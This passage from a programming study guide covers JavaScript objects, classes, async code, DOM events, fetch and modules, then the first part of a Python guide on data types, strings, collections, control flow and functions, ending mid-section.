arr.some(n => n > 4)          // true — AT LEAST ONE matches

// Destructuring
const [first, second, ...rest] = [1, 2, 3, 4, 5];
// first=1, second=2, rest=[3,4,5]

const [a, , b] = [1, 2, 3];  // Skip element: a=1, b=3
const [x = 10] = [];          // Default: x=10

// Spread
const combined = [...arr1, ...arr2];
const copy = [...arr];

// Useful patterns
const unique = [...new Set(arr)];           // Remove duplicates
const sorted = [...arr].sort((a,b) => a-b); // Sort without mutation
const chunked = arr.reduce((chunks, item, i) =>
  (i % 3 === 0 ? chunks.push([item]) : chunks[chunks.length-1].push(item), chunks), []);
```

---

## 11. Objects

```javascript
// Object literal
const user = {
  name: "Alice",
  age: 25,
  "full name": "Alice Smith",  // Quoted key
  greet() {                    // Method shorthand
    return `Hi, I'm ${this.name}`;
  }
};

// Property access
user.name            // "Alice"
user["name"]         // "Alice" — use for dynamic keys or special chars
user["full name"]    // "Alice Smith"

// Dynamic key
const key = "name";
user[key]            // "Alice"

// Property existence
"name" in user       // true
user.hasOwnProperty("name")  // true (not inherited)
Object.hasOwn(user, "name")  // Modern version

// Delete property
delete user.age;

// Object methods
Object.keys(user)           // ["name", "greet"]
Object.values(user)         // ["Alice", function]
Object.entries(user)        // [["name","Alice"], ["greet", fn]]
Object.fromEntries([["a",1],["b",2]])  // { a:1, b:2 }

Object.assign(target, source1, source2)   // Merge (shallow)
Object.assign({}, user)                    // Shallow copy
const copy = Object.assign({}, user);

// Spread (same as assign)
const copy2 = { ...user };
const updated = { ...user, age: 26 };   // Overwrite age

Object.freeze(obj)     // Make immutable (shallow)
Object.seal(obj)       // Allow modifying, not adding/deleting
Object.isFrozen(obj)
Object.isSealed(obj)

Object.create(proto)   // Create object with given prototype
Object.getPrototypeOf(obj)
Object.setPrototypeOf(obj, proto)

Object.defineProperty(obj, "key", {
  value: 42,
  writable: false,
  enumerable: true,
  configurable: false
});

Object.getOwnPropertyNames(obj)   // All own properties including non-enumerable

// Destructuring
const { name, age, city = "NYC" } = user;   // city defaults to "NYC"
const { name: fullName } = user;             // Rename to fullName

// Nested
const { address: { street } } = user;
const { address: { street: s = "N/A" } } = user;

// In function parameters
function displayUser({ name, age = 0 }) {
  console.log(`${name}: ${age}`);
}

// Computed property names
const propName = "score";
const obj = { [propName]: 100, [`${propName}_max`]: 200 };
```

---

## 12. Classes

```javascript
class Animal {
  // Private field (new syntax)
  #name;
  #sound;
  static count = 0;   // Static property

  constructor(name, sound) {
    this.#name = name;
    this.#sound = sound;
    Animal.count++;
  }

  // Instance method
  speak() {
    return `${this.#name} says ${this.#sound}!`;
  }

  // Getter
  get name() {
    return this.#name;
  }

  // Setter
  set name(value) {
    if (typeof value !== "string") throw new TypeError("Name must be a string");
    this.#name = value;
  }

  // Static method (called on class, not instances)
  static create(name, sound) {
    return new Animal(name, sound);
  }

  // Override toString
  toString() {
    return `[Animal: ${this.#name}]`;
  }
}

class Dog extends Animal {
  #tricks = [];

  constructor(name) {
    super(name, "Woof");  // Call parent constructor (required before using this)
  }

  learn(trick) {
    this.#tricks.push(trick);
    return this;  // Enable chaining
  }

  perform() {
    return this.#tricks.map(t => `${this.name} performs: ${t}`);
  }

  // Override parent method
  speak() {
    return super.speak() + " *wags tail*";
  }
}

const dog = new Dog("Rex");
dog.learn("sit").learn("shake");
console.log(dog.speak());
console.log(dog.perform());
console.log(dog instanceof Dog);    // true
console.log(dog instanceof Animal); // true
console.log(Animal.count);          // number of animals created
```

---

## 13. Destructuring and Spread (Advanced)

```javascript
// Swap variables
let a = 1, b = 2;
[a, b] = [b, a];   // a=2, b=1

// Function returning multiple values
function getMinMax(arr) {
  return [Math.min(...arr), Math.max(...arr)];
}
const [min, max] = getMinMax([3,1,4,1,5,9]);

// Nested destructuring
const { data: { users: [firstUser, ...otherUsers] } } = apiResponse;

// Mixed
const [{ name }, { age }] = [{ name: "Alice" }, { age: 25 }];
```

---

## 14. Promises and Async/Await

```javascript
// Promise basics
const promise = new Promise((resolve, reject) => {
  setTimeout(() => {
    if (Math.random() > 0.5) {
      resolve("Success!");
    } else {
      reject(new Error("Failed!"));
    }
  }, 1000);
});

// Consuming promises
promise
  .then(result => console.log(result))
  .catch(error => console.error(error))
  .finally(() => console.log("Always runs"));

// Chaining
fetch("/api/user")
  .then(res => res.json())
  .then(data => data.name)
  .then(name => console.log(name))
  .catch(err => console.error(err));

// Promise combinators
Promise.all([p1, p2, p3])        // All must succeed; rejects if any fail
Promise.allSettled([p1, p2, p3]) // Wait for all; get all results
Promise.race([p1, p2, p3])       // First to resolve/reject wins
Promise.any([p1, p2, p3])        // First to RESOLVE wins; rejects if ALL fail

// Async/Await (syntactic sugar over Promises)
async function fetchUser(id) {
  try {
    const response = await fetch(`/api/users/${id}`);
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Error fetching user:", error);
    throw error;  // Re-throw if caller needs to handle it
  } finally {
    console.log("Request completed");
  }
}

// Parallel async operations
async function loadDashboard(userId) {
  // Sequential (slower)
  const user = await fetchUser(userId);
  const posts = await fetchPosts(userId);

  // Parallel (faster)
  const [user2, posts2] = await Promise.all([
    fetchUser(userId),
    fetchPosts(userId)
  ]);
}

// Async IIFE
(async () => {
  const data = await fetchUser(1);
  console.log(data);
})();

// For-await-of (async iteration)
async function processStream(stream) {
  for await (const chunk of stream) {
    process(chunk);
  }
}
```

---

## 15. Error Handling

```javascript
// try / catch / finally
try {
  const result = JSON.parse(invalidJSON);
  riskyOperation();
} catch (error) {
  if (error instanceof SyntaxError) {
    console.error("JSON parse error:", error.message);
  } else if (error instanceof TypeError) {
    console.error("Type error:", error.message);
  } else {
    console.error("Unknown error:", error);
  }
} finally {
  cleanup();
}

// Error types
new Error("Generic error");
new TypeError("Wrong type");
new RangeError("Out of range");
new ReferenceError("Variable doesn't exist");
new SyntaxError("Invalid syntax");
new URIError("Malformed URI");

// Custom errors
class ValidationError extends Error {
  constructor(message, field) {
    super(message);
    this.name = "ValidationError";
    this.field = field;
  }
}

class NetworkError extends Error {
  constructor(message, statusCode) {
    super(message);
    this.name = "NetworkError";
    this.statusCode = statusCode;
  }
}

// Throwing
function divide(a, b) {
  if (b === 0) throw new RangeError("Cannot divide by zero");
  return a / b;
}
```

---

## 16. DOM Manipulation

```javascript
// Selecting elements
document.getElementById("myId")              // One element
document.querySelector(".my-class")          // First match (CSS selector)
document.querySelectorAll("p.highlight")     // All matches (NodeList)
document.querySelector("ul > li:first-child")

document.getElementsByClassName("card")      // HTMLCollection (live)
document.getElementsByTagName("div")

// Traversal
element.parentElement
element.children             // Child elements (HTMLCollection)
element.firstElementChild
element.lastElementChild
element.nextElementSibling
element.previousElementSibling
element.closest(".container") // Nearest ancestor matching selector

// Creating and inserting
const div = document.createElement("div");
div.className = "card";
div.textContent = "Hello";
div.innerHTML = "<strong>Hello</strong>";

document.body.appendChild(div);
document.body.prepend(div);
parent.insertBefore(div, referenceElement);
parent.replaceChild(newEl, oldEl);

// Modern insertion
element.append(div, "text")         // After last child (accepts multiple)
element.prepend(div)                // Before first child
element.before(div)                 // Before element
element.after(div)                  // After element
element.replaceWith(div)

// Template literals for HTML
parent.innerHTML = `
  <div class="card">
    <h2>${user.name}</h2>
    <p>${user.bio}</p>
  </div>
`;

// Removing
element.remove();
parent.removeChild(element);

// Attributes
element.getAttribute("href")
element.setAttribute("href", "/new-url")
element.removeAttribute("disabled")
element.hasAttribute("hidden")

// Dataset (data-* attributes)
// <div data-user-id="42" data-role="admin">
element.dataset.userId   // "42"
element.dataset.role     // "admin"
element.dataset.newKey = "value"  // Creates data-new-key attribute

// Classes
element.classList.add("active", "highlighted")
element.classList.remove("active")
element.classList.toggle("visible")
element.classList.contains("active")   // boolean
element.classList.replace("old", "new")
element.className      // All classes as string

// Styles
element.style.color = "red";
element.style.backgroundColor = "blue";
element.style.cssText = "color: red; font-size: 16px;";
getComputedStyle(element).color   // Actual computed value

// Content
element.textContent    // Text content (safe from XSS)
element.innerHTML      // HTML content (be careful with user input!)
element.innerText      // Rendered text (respects CSS visibility)
element.outerHTML      // Element + its HTML

// Dimensions
element.offsetWidth     // Width including border
element.offsetHeight
element.clientWidth     // Width including padding, no border
element.clientHeight
element.scrollWidth     // Full scroll width
element.scrollHeight
element.getBoundingClientRect()  // Returns DOMRect {top, right, bottom, left, width, height}
```

---

## 17. Events

```javascript
// Adding event listeners
element.addEventListener("click", handler);
element.addEventListener("click", handler, { once: true });   // Fire once
element.addEventListener("click", handler, { passive: true }); // Scroll perf
element.addEventListener("click", handler, true);             // Capture phase

// Removing (must reference same function!)
element.removeEventListener("click", handler);

// Event object
element.addEventListener("click", (event) => {
  event.target          // Element that triggered event
  event.currentTarget   // Element listener is attached to
  event.type            // "click"
  event.timestamp       // Time event fired
  event.preventDefault()  // Prevent default behavior (form submit, link follow)
  event.stopPropagation()  // Stop bubbling up the DOM
  event.stopImmediatePropagation()  // Stop other listeners on same element

  // Mouse events
  event.clientX, event.clientY   // Position relative to viewport
  event.pageX, event.pageY       // Position relative to document
  event.offsetX, event.offsetY   // Position relative to element
  event.button      // 0=left, 1=middle, 2=right
  event.buttons     // Bitmask
  event.ctrlKey     // boolean
  event.shiftKey    // boolean
  event.altKey      // boolean
  event.metaKey     // Cmd on Mac

  // Keyboard events
  event.key         // "a", "Enter", "ArrowLeft"
  event.code        // "KeyA", "Enter", "ArrowLeft"
  event.keyCode     // Deprecated

  // Form events
  event.target.value   // Input value
});

// Common events
"click", "dblclick", "mousedown", "mouseup", "mouseover",
"mouseout", "mousemove", "mouseenter", "mouseleave",
"keydown", "keyup", "keypress",
"focus", "blur", "focusin", "focusout",
"input", "change", "submit", "reset",
"scroll", "resize", "load", "DOMContentLoaded",
"unload", "beforeunload",
"dragstart", "drag", "dragend", "dragover", "drop",
"touchstart", "touchend", "touchmove",
"pointerdown", "pointerup", "pointermove",
"transitionend", "animationend",
"contextmenu"

// Event delegation (handle child events on parent)
document.querySelector("ul").addEventListener("click", (e) => {
  if (e.target.matches("li")) {
    console.log("Clicked:", e.target.textContent);
  }
});

// Custom events
const event = new CustomEvent("userLogin", {
  detail: { userId: 42 },
  bubbles: true,
  cancelable: true
});
element.dispatchEvent(event);

element.addEventListener("userLogin", (e) => {
  console.log("User logged in:", e.detail.userId);
});

// DOMContentLoaded vs load
document.addEventListener("DOMContentLoaded", () => {
  // HTML parsed and DOM ready (no images/stylesheets needed)
});
window.addEventListener("load", () => {
  // Everything (images, stylesheets) fully loaded
});
```

---

## 18. Fetch API and HTTP Requests

```javascript
// Basic GET
const response = await fetch("https://api.example.com/data");
const data = await response.json();

// Full fetch with options
const response = await fetch("https://api.example.com/users", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Authorization": "Bearer " + token,
    "Accept": "application/json"
  },
  body: JSON.stringify({
    name: "Alice",
    email: "alice@example.com"
  }),
  credentials: "include",    // Send cookies
  cache: "no-cache",
  signal: controller.signal  // For cancellation
});

// Check response
if (!response.ok) {
  throw new Error(`HTTP error! status: ${response.status}`);
}

// Response methods
response.json()      // Parse JSON body
response.text()      // Get body as text
response.blob()      // Get body as Blob (binary data)
response.formData()  // Get body as FormData
response.arrayBuffer() // Get body as ArrayBuffer

response.status        // 200, 404, 500...
response.statusText    // "OK", "Not Found"...
response.headers       // Headers object
response.url           // Final URL (after redirects)
response.redirected    // true if redirected

// Abort request
const controller = new AbortController();
setTimeout(() => controller.abort(), 5000);  // Timeout after 5s

try {
  const response = await fetch(url, { signal: controller.signal });
} catch (err) {
  if (err.name === "AbortError") console.log("Request cancelled");
}

// Form data
const formData = new FormData(formElement);
// or
const formData = new FormData();
formData.append("name", "Alice");
formData.append("file", fileInput.files[0]);

await fetch("/upload", {
  method: "POST",
  body: formData  // Don't set Content-Type; browser sets it with boundary
});

// URL parameters
const params = new URLSearchParams({ page: 1, limit: 10, search: "hello" });
const url = `https://api.example.com/items?${params}`;
// Results in: https://api.example.com/items?page=1&limit=10&search=hello
```

---

## 19. Web Storage

```javascript
// localStorage: persists across sessions
localStorage.setItem("key", "value");
localStorage.setItem("user", JSON.stringify({ name: "Alice", age: 25 }));
localStorage.getItem("key")          // "value"
JSON.parse(localStorage.getItem("user"))  // { name: "Alice", age: 25 }
localStorage.removeItem("key")
localStorage.clear()
localStorage.length
localStorage.key(0)   // Get key by index

// sessionStorage: cleared when tab closes
sessionStorage.setItem("token", "abc123");
sessionStorage.getItem("token");
sessionStorage.removeItem("token");

// Storage event (cross-tab communication)
window.addEventListener("storage", (e) => {
  console.log(e.key, e.oldValue, e.newValue, e.url);
});

// Utility functions
function saveToStorage(key, data) {
  try {
    localStorage.setItem(key, JSON.stringify(data));
  } catch (e) {
    console.error("Storage full:", e);
  }
}

function loadFromStorage(key, defaultValue = null) {
  try {
    const item = localStorage.getItem(key);
    return item ? JSON.parse(item) : defaultValue;
  } catch (e) {
    return defaultValue;
  }
}
```

---

## 20. Modules (ES Modules)

```javascript
// math.js — exporting
export const PI = 3.14159;

export function add(a, b) { return a + b; }
export function subtract(a, b) { return a - b; }

export default class Calculator {
  // ...
}

// Named and default together
export { add, subtract };
export default Calculator;

// app.js — importing
import Calculator from "./math.js";           // Default import
import { add, subtract } from "./math.js";    // Named imports
import { add as sum } from "./math.js";       // Renamed
import * as Math from "./math.js";            // Namespace import
import Calculator, { PI, add } from "./math.js"; // Both

// Dynamic import (lazy loading)
const module = await import("./heavy-module.js");
module.default.doSomething();

// Re-exporting
export { add, subtract } from "./math.js";
export { default } from "./calculator.js";
export * from "./utils.js";
```

---

## 21. Iterators and Generators

```javascript
// Iterator protocol
const range = {
  [Symbol.iterator]() {
    let current = this.start;
    const end = this.end;
    return {
      next() {
        if (current <= end) {
          return { value: current++, done: false };
        }
        return { value: undefined, done: true };
      }
    };
  },
  start: 1,
  end: 5
};

for (const num of range) console.log(num);  // 1 2 3 4 5

// Generator functions
function* count(start = 0, step = 1) {
  let current = start;
  while (true) {
    const reset = yield current;
    if (reset) {
      current = start;
    } else {
      current += step;
    }
  }
}

const counter = count(10, 2);
counter.next()         // { value: 10, done: false }
counter.next()         // { value: 12, done: false }
counter.next(true)     // { value: 10, done: false } — reset
```

---

## 22. Common Interview Questions

**Q: What is the difference between `var`, `let`, and `const`?**
A: `var` is function-scoped and hoisted (initialized as `undefined`). `let` and `const` are block-scoped and in the "temporal dead zone" before declaration. `const` cannot be reassigned. Use `const` by default, `let` when you need to reassign, avoid `var`.

**Q: Explain the event loop.**
A: JS is single-threaded. The event loop checks the call stack and, when empty, moves tasks from the callback queue to the stack. Promises use the microtask queue which is drained before the macrotask queue.

**Q: What is closure?**
A: A function that remembers the variables from its outer scope even after the outer function has returned. Used for data privacy, factories, and memoization.

**Q: What is `this` in JavaScript?**
A: In a regular function, `this` is the calling object (dynamic). In arrow functions, `this` is lexically inherited from the surrounding scope. In strict mode, `this` is `undefined` if no calling object.

**Q: What is the difference between `==` and `===`?**
A: `==` performs type coercion; `===` does not. `"5" == 5` is `true`; `"5" === 5` is `false`. Always use `===`.

**Q: What is a Promise?**
A: An object representing the eventual completion or failure of an async operation. States: pending, fulfilled, rejected. Can be chained with `.then()/.catch()` or used with `async/await`.

**Q: What is event delegation?**
A: Attaching a single event listener to a parent element to handle events from all current and future child elements. Efficient for dynamic content.

---

*End of JavaScript Study Guide*


---

# Python — Complete Study Guide

---

## 1. What Is Python?

Python is a **high-level, interpreted, dynamically typed, general-purpose** programming language. Created by Guido van Rossum (1991). Its design philosophy emphasizes code readability (uses indentation instead of braces) and simplicity ("one obvious way to do it").

Use cases: web development, data science, machine learning, automation, scripting, scientific computing, DevOps, security tools.

---

## 2. Python Setup and Running Code

```bash
# Check version
python --version      # Python 3.x.x
python3 --version

# Interactive interpreter (REPL)
python3

# Run a script
python3 script.py

# Virtual environments (isolate project dependencies)
python3 -m venv venv           # Create venv
source venv/bin/activate        # Activate (Linux/Mac)
venv\Scripts\activate          # Activate (Windows)
deactivate                      # Leave venv

# Package manager
pip install requests
pip install -r requirements.txt
pip list
pip freeze > requirements.txt
```

---

## 3. Variables and Data Types

```python
# Variables — no type declaration needed
name = "Alice"
age = 25
height = 5.9
is_active = True
data = None

# Multiple assignment
x = y = z = 0
a, b, c = 1, 2, 3
a, b = b, a    # Swap values

# Type checking
type(name)         # <class 'str'>
type(age)          # <class 'int'>
isinstance(age, int)         # True
isinstance(name, (str, int)) # True — check multiple types

# Type conversion
int("42")          # 42
int(3.9)           # 3 (truncates)
float("3.14")      # 3.14
str(42)            # "42"
bool(0)            # False
bool("")           # False
bool(None)         # False
bool([])           # False
# Everything else is truthy

list("hello")      # ['h','e','l','l','o']
tuple([1,2,3])     # (1, 2, 3)
set([1,2,2,3])     # {1, 2, 3}
dict([("a",1),("b",2)])  # {'a': 1, 'b': 2}
```

---

## 4. Numbers

```python
# Integer
x = 42
big = 1_000_000    # Underscores for readability
binary = 0b1010    # 10 in binary
octal = 0o17       # 15 in octal
hex_val = 0xFF     # 255 in hex

# Float
f = 3.14
scientific = 1.5e-3   # 0.0015

# Complex
c = 3 + 4j
c.real   # 3.0
c.imag   # 4.0

# Arithmetic
10 / 3     # 3.3333... (true division)
10 // 3    # 3 (floor division)
10 % 3     # 1 (modulo)
2 ** 10    # 1024 (exponent)
-7 // 2    # -4 (floors toward negative infinity!)
-7 % 2     # 1

# Math module
import math
math.pi              # 3.14159...
math.e               # 2.71828...
math.sqrt(16)        # 4.0
math.floor(3.7)      # 3
math.ceil(3.2)       # 4
math.factorial(5)    # 120
math.gcd(12, 8)      # 4
math.log(100, 10)    # 2.0
math.sin(math.pi/2)  # 1.0
math.inf             # Infinity
math.nan             # NaN
math.isnan(x)
math.isinf(x)

# abs, round, divmod, pow
abs(-5)              # 5
round(3.14159, 2)    # 3.14
round(2.5)           # 2 (banker's rounding!)
round(3.5)           # 4
divmod(10, 3)        # (3, 1) — quotient and remainder
pow(2, 10)           # 1024
pow(2, 10, 1000)     # 24 (modular exponentiation)

# Decimal for precision
from decimal import Decimal
Decimal("0.1") + Decimal("0.2")  # Decimal('0.3') — precise!

# Fractions
from fractions import Fraction
Fraction(1, 3)   # Fraction(1, 3)
Fraction(1, 3) + Fraction(1, 6)  # Fraction(1, 2)
```

---

## 5. Strings

```python
# Creation
s = "Hello, World!"
s = 'Single quotes'
s = """Triple double
       quotes for multiline"""
s = '''Triple single quotes'''
raw = r"Raw string: \n is literal"
byte = b"Byte string"
formatted = f"2 + 2 = {2 + 2}"

# F-strings (Python 3.6+)
name = "Alice"
age = 25
f"{name.upper()}"         # "ALICE"
f"{age:>10}"              # Right-align in width 10
f"{age:0>10}"             # Pad with zeros: 0000000025
f"{3.14159:.2f}"          # "3.14" — 2 decimal places
f"{1000000:,}"            # "1,000,000" — thousands separator
f"{name!r}"               # "'Alice'" — repr()
f"{name!s}"               # "Alice" — str()
f"{name!a}"               # ASCII repr

# String methods
s = "  Hello, World!  "
s.upper()             # "  HELLO, WORLD!  "
s.lower()
s.title()             # "  Hello, World!  "
s.strip()             # "Hello, World!"
s.lstrip()            # "Hello, World!  "
s.rstrip()            # "  Hello, World!"
s.replace("World", "Python")  # "  Hello, Python!  "
s.split(", ")         # ['  Hello', 'World!  ']
s.split()             # Split on whitespace: ['Hello,', 'World!']
s.splitlines()        # Split on newlines
", ".join(["a","b","c"])  # "a, b, c"
s.find("World")       # 8 (index) or -1 if not found
s.index("World")      # 8 or raises ValueError
s.count("l")          # 3
s.startswith("  H")   # True
s.endswith("  ")      # True
s.strip().startswith("H")  # True
s.isdigit()           # False
s.isalpha()           # False
s.isalnum()           # False
s.isspace()           # False
s.isupper()           # False
s.islower()           # False
s.center(30, "*")     # Pad with * to width 30
s.zfill(20)           # Pad with zeros on left
s.expandtabs(4)       # Replace \t with spaces
s.encode("utf-8")     # Convert to bytes
b"hello".decode("utf-8")  # Convert from bytes

# Slicing
s = "Hello, World!"
s[0]      # 'H'
s[-1]     # '!'
s[7:12]   # 'World'
s[:5]     # 'Hello'
s[7:]     # 'World!'
s[::2]    # Every other char: 'HloWrd'
s[::-1]   # Reversed: '!dlroW ,olleH'
s[2:10:2] # Start at 2, end at 10, step 2: 'lo o'

# Immutability: strings cannot be modified in place
# s[0] = "h"  # TypeError!

# String formatting (old styles)
"%s is %d years old" % (name, age)
"{} is {} years old".format(name, age)
"{name} is {age}".format(name=name, age=age)

# Useful string functions
len(s)            # Length
ord("A")          # 65 (Unicode code point)
chr(65)           # "A"
"hello" * 3       # "hellohellohello"
"Hello" in s      # True

# Multiline strings
query = """
    SELECT *
    FROM users
    WHERE active = 1
"""
```

---

## 6. Lists

```python
# Creation
lst = [1, 2, 3, 4, 5]
lst = list(range(1, 6))
lst = list("hello")       # ['h','e','l','l','o']
empty = []

# Access
lst[0]     # 1 (first)
lst[-1]    # 5 (last)
lst[1:3]   # [2, 3] (slice)
lst[::2]   # [1, 3, 5] (every other)
lst[::-1]  # [5, 4, 3, 2, 1] (reversed)

# Modifying
lst.append(6)           # Add to end
lst.extend([7, 8])      # Add multiple
lst.insert(0, 0)        # Insert at index
lst.remove(3)           # Remove FIRST occurrence of value
popped = lst.pop()      # Remove and return last
popped = lst.pop(1)     # Remove and return at index
lst.clear()             # Remove all
lst[1] = 99             # Modify by index
lst[1:3] = [10, 20]     # Replace slice

# Non-modifying
lst.index(3)            # Find index (raises ValueError if not found)
lst.count(3)            # Count occurrences
3 in lst                # True/False membership test
len(lst)                # Length
sorted(lst)             # Return sorted list (new)
reversed(lst)           # Return iterator
lst.copy()              # Shallow copy
list(lst)               # Shallow copy
lst[:]                  # Shallow copy

# Modifying in-place
lst.sort()                         # Sort ascending
lst.sort(reverse=True)             # Sort descending
lst.sort(key=len)                  # Sort by key
lst.sort(key=lambda x: x.lower()) # Sort case-insensitive
lst.reverse()                      # Reverse in place

# List comprehensions
squares = [x**2 for x in range(10)]
evens = [x for x in range(20) if x % 2 == 0]
flat = [n for row in matrix for n in row]
pairs = [(x, y) for x in range(3) for y in range(3)]
words = [word.upper() for word in sentence.split() if len(word) > 3]

# Nested lists
matrix = [[1,2,3],[4,5,6],[7,8,9]]
matrix[1][2]    # 6
transposed = [[row[i] for row in matrix] for i in range(3)]

# Useful operations
max(lst), min(lst), sum(lst)
all(x > 0 for x in lst)  # True if all positive
any(x < 0 for x in lst)  # True if any negative
zip([1,2,3], ["a","b","c"])  # [(1,"a"), (2,"b"), (3,"c")]
enumerate(lst)               # [(0,item1), (1,item2), ...]
enumerate(lst, start=1)      # Start index at 1
```

---

## 7. Tuples

```python
# Tuples: ordered, immutable sequences
t = (1, 2, 3)
single = (42,)        # Note comma! (42) is just 42
empty = ()
t = 1, 2, 3           # Parens optional

# All list READ methods work
t[0], t[-1], t[1:3]
len(t), t.count(2), t.index(2)
2 in t

# Unpacking
a, b, c = (1, 2, 3)
first, *rest = (1, 2, 3, 4, 5)      # first=1, rest=[2,3,4,5]
*head, last = (1, 2, 3, 4, 5)       # head=[1,2,3,4], last=5
a, _, b = (1, 2, 3)                 # _ discards middle

# Named tuples (like lightweight classes)
from collections import namedtuple
Point = namedtuple("Point", ["x", "y"])
p = Point(10, 20)
p.x         # 10
p.y         # 20
p[0]        # 10 (also indexable)
p._asdict() # {'x': 10, 'y': 20}

# When to use tuples vs lists
# Tuples: fixed data, keys in dicts, function returns, unpacking
# Lists: mutable sequences, homogeneous data
```

---

## 8. Dictionaries

```python
# Creation
d = {"name": "Alice", "age": 25}
d = dict(name="Alice", age=25)
d = dict([("name", "Alice"), ("age", 25)])
d = {i: i**2 for i in range(5)}  # Dict comprehension

# Access
d["name"]              # "Alice" — KeyError if missing
d.get("name")          # "Alice" — None if missing
d.get("email", "N/A")  # "N/A" — default if missing

# Modification
d["email"] = "alice@example.com"   # Add or update
d.update({"city": "NYC", "age": 26})  # Update multiple
d.update(city="NYC")

# Deletion
del d["email"]
removed = d.pop("age")       # Remove and return value
removed = d.pop("x", None)   # With default (no error)
d.clear()                    # Remove all

# Check existence
"name" in d          # True
"name" not in d      # False

# Iteration
for key in d:                    # Iterate keys
    print(key, d[key])

for key in d.keys():             # Explicit keys
for value in d.values():         # Values
for key, value in d.items():     # Key-value pairs

# Views (live, reflect changes)
d.keys()     # dict_keys(['name', 'age'])
d.values()   # dict_values(['Alice', 25])
d.items()    # dict_items([('name','Alice'),('age',25)])

# Useful methods
d.setdefault("score", 0)    # Set key if missing; return value
d.copy()                    # Shallow copy

# Merging
merged = {**d1, **d2}        # d2 overwrites d1 on conflicts (Python 3.5+)
merged = d1 | d2             # Python 3.9+ pipe operator
d1 |= d2                     # Update in place

# Dict comprehensions
word_lengths = {word: len(word) for word in words}
filtered = {k: v for k, v in d.items() if v > 0}
inverted = {v: k for k, v in d.items()}

# defaultdict (auto-creates missing keys)
from collections import defaultdict
word_count = defaultdict(int)
for word in words:
    word_count[word] += 1

groups = defaultdict(list)
for item in items:
    groups[item.category].append(item)

# Counter (special dict for counting)
from collections import Counter
c = Counter("aababcabcd")
c.most_common(3)      # [('a', 4), ('b', 3), ('c', 2)]
c.total()             # Sum of all counts
Counter([1,2,2,3]) + Counter([1,2])  # Combine counts

# OrderedDict (pre 3.7 — now regular dict maintains order)
from collections import OrderedDict

# ChainMap (search multiple dicts without merging)
from collections import ChainMap
chain = ChainMap(user_config, default_config)
chain["key"]  # Found in user_config first
```

---

## 9. Sets

```python
# Creation (no duplicates, unordered)
s = {1, 2, 3, 4}
s = set([1, 2, 2, 3])    # {1, 2, 3}
s = set("hello")          # {'h', 'e', 'l', 'o'}
empty = set()             # NOT {} (that's a dict!)

# Operations
s.add(5)              # Add single element
s.update([5, 6, 7])   # Add multiple
s.discard(3)          # Remove (no error if absent)
s.remove(3)           # Remove (KeyError if absent)
popped = s.pop()      # Remove and return arbitrary element

3 in s                # Membership test O(1)
len(s)

# Set math
a = {1, 2, 3, 4}
b = {3, 4, 5, 6}

a | b         # Union: {1,2,3,4,5,6}
a.union(b)

a & b         # Intersection: {3,4}
a.intersection(b)

a - b         # Difference (in a but not b): {1,2}
a.difference(b)

a ^ b         # Symmetric difference (in either but not both): {1,2,5,6}
a.symmetric_difference(b)

a.issubset(b)          # All of a in b?
a.issuperset(b)        # All of b in a?
a.isdisjoint(b)        # No common elements?

a <= b    # Subset
a < b     # Proper subset (subset but not equal)
a >= b    # Superset
a > b     # Proper superset

# Set comprehension
squares = {x**2 for x in range(10)}

# frozenset (immutable set — can be a dict key)
fs = frozenset([1, 2, 3])
```

---

## 10. Control Flow

```python
# if / elif / else
score = 85
if score >= 90:
    grade = "A"
elif score >= 80:
    grade = "B"
elif score >= 70:
    grade = "C"
else:
    grade = "F"

# Ternary (conditional expression)
grade = "Pass" if score >= 60 else "Fail"

# match statement (Python 3.10+ — structural pattern matching)
match command:
    case "quit" | "exit":
        quit()
    case "help":
        show_help()
    case str(x) if x.startswith("go "):
        move(x[3:])
    case {"action": action, "target": target}:
        handle(action, target)
    case [x, y]:
        move_to(x, y)
    case _:
        print("Unknown command")

# for loop
for i in range(10):        # 0-9
    print(i)

for i in range(0, 10, 2):  # 0, 2, 4, 6, 8
    print(i)

for i in range(10, 0, -1): # 10, 9, 8... 1
    print(i)

for item in ["a", "b", "c"]:
    if item == "b":
        continue   # Skip
    if item == "c":
        break      # Exit
    print(item)
else:
    # Runs only if loop completed without break
    print("Done!")

# for with enumerate and zip
for i, value in enumerate(["a", "b", "c"], start=1):
    print(f"{i}: {value}")

for name, age in zip(names, ages):
    print(f"{name}: {age}")

# While loop
n = 0
while n < 10:
    n += 1
else:
    print("Finished!")

# Walrus operator (Python 3.8+) — assign and test
while chunk := file.read(1024):
    process(chunk)

data = [y := f(x), y**2, y**3]

# Pass (placeholder)
if condition:
    pass   # TODO: implement
```

---

## 11. Functions

```python
# Basic function
def greet(name):
    """Docstring explaining function."""
    return f"Hello, {name}!"

# Default arguments
def create_user(name, role="user", active=True):
    return {"name": name, "role": role, "active": active}

# *args (variable positional)
def sum_all(*args):
    return sum(args)
sum_all(1, 2, 3, 4, 5)   # 15

# **kwargs (variable keyword)
def build_tag(tag, **attrs):
    attr_str = " ".join(f'{k}="{v}"' for k, v in attrs.items())
    return f"<{tag} {attr_str}>"

build_tag("a", href="/home", class_="nav")

# Keyword-only arguments
def func(pos, /, normal, *, kw_only):
    """
    pos: positional only (before /)
    normal: positional or keyword
    kw_only: keyword only (after *)
    """

# Unpacking in calls
args = [1, 2, 3]
func(*args)          # Unpack as positional
kwargs = {"a": 1}
func(**kwargs)       # Unpack as keyword

# Lambda (anonymous function)
square = lambda x: x**2
double = lambda x: x * 2
add = lambda x, y: x + y
sorted(items, key=lambda x: x.price)

# Returning multiple values
def min_max(lst):
    return min(lst), max(lst)   # Returns tuple

lo, hi = min_max([3,1,4,1,5])

# Type hints (Python 3.5+, not enforced at runtime)
def greet(name: str, times: int = 1) -> str:
    return (f"Hello, {name}! " * times).strip()

from typing import List, Dict, Optional, Union, Tuple, Any
def process(data: List[int]) -> Dict[str, int]:
    pass
def maybe(x: Optional[str] = None) -> None:
    pass

# Decorators
def timer(func):
    import time
    def wrapper(*args, **kwargs):
        start = time.time()
        result = func(*args, **kwargs)
        end = time.time()
        print(f"{func.__name__} took {end-start:.4f}s")
        return result
    return wrapper

@timer
def slow_function():
    import time
    time.sleep(1)

# functools.wraps — preserve metadata
from functools import wraps
def my_decorator(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("Before")
        result = func(*args, **kwargs)
        print("After")
        return result
    return wrapper

# Closures
def make_multiplier(factor):
    def multiplier(n):
        return n * factor
    return multiplier

triple = make_multiplier(3)
triple(5)   # 15

# functools utilities
from functools import partial, reduce, lru_cache

# Partial: fix some arguments
power_of_2 = partial(pow, 2)
